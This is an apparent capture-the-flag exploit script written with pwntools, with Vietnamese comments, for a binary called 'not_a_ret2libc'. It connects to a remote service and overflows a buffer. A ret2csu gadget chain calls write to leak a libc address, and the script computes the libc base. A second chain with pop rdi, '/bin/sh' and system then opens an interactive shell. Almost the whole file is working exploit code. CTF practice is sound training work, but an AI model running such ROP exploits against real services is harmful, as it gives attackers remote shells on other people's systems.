from pwn import * 

r = remote("45.122.249.68", 10022)
# r = process('./not_a_ret2libc')
elf = context.binary = ELF('./not_a_ret2libc')
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF('./libc-2.31.so')
csu1 = 0x4011fa 
# .text:00000000004011FA                 pop     rbx
# .text:00000000004011FB                 pop     rbp
# .text:00000000004011FC                 pop     r12
# .text:00000000004011FE                 pop     r13
# .text:0000000000401200                 pop     r14
# .text:0000000000401202                 pop     r15
# .text:0000000000401204                 retn

csu2 = 0x4011e0
# .text:00000000004011E0                 mov     rdx, r14
# .text:00000000004011E3                 mov     rsi, r13
# .text:00000000004011E6                 mov     edi, r12d
# .text:00000000004011E9                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]
# .text:00000000004011ED                 add     rbx, 1
# .text:00000000004011F1                 cmp     rbp, rbx
# .text:00000000004011F4                 jnz     short loc_4011E0
# rbx =0; rbp =1; r12 = rdi; r13 = rsi; r14 = rdx
pop_rdi = 0x401203
ret = 0x40101a
payload = b'a' # nhập 1 byte cho biến buf
payload += p64(0) # ghi đè 8 bytes của thanh ghi rbp
payload += p64(csu1) #ghi đè rsp về địa chỉ của csu1 là instruction pop các thanh ghi mà ta cần
payload += p64(0) #rbx = 0
payload += p64(1) # rbp = 1
# write(1,elf.got['write'],6) => rdi =1, rsi = elf.got['write'], rdx = 6
payload += p64(1) #r12 = rdi = 1 
payload += p64(elf.got['write']) # r13 = rsi = elf.got['write']
payload += p64(6) #r14 = rdx = 6
payload += p64(elf.got['write']) # r15 = elf.got['write'] để gọi hàm write
payload += p64(csu2) # gọi csu2 để cho nó truyền các thanh ghi mà mình cần
payload += p64(0)*7 #ghi đè các bytes rác để có thể reach tới ret
payload += p64(elf.sym['main']) #return về hàm main để có thể in ra địa chỉ của libc cũng như hoàn thành nốt exploit
r.sendline(payload)
r.recvuntil(b"give me something please: \x00")
leak = r.recvuntil(b"give me",drop = True)
leak = u64(leak.ljust(8,b'\x00'))
print("write leak: "+hex(leak))
libc.address = leak - libc.sym['write']
print("libc base: " +hex(libc.address))
payload_1  = b'a' # nhập 1 byte cho biến buf
payload_1 += p64(0) #ghi đè 8 bytes của thanh ghi rbp
payload_1 += p64(ret) # ở một số phiên bản của glibc cần phải chèn ret để cho nó align payload với stack, việc này tùy các phiên bản
payload_1 += p64(pop_rdi) # gọi rdi
payload_1 += p64(next(libc.search(b'/bin/sh'))) #truyền '/bin/sh' vào tham số thứ nhất
payload_1 += p64(libc.sym['system']) #ghi đè rsp bằng việc gọi hàm system
r.sendline(payload_1)
r.interactive()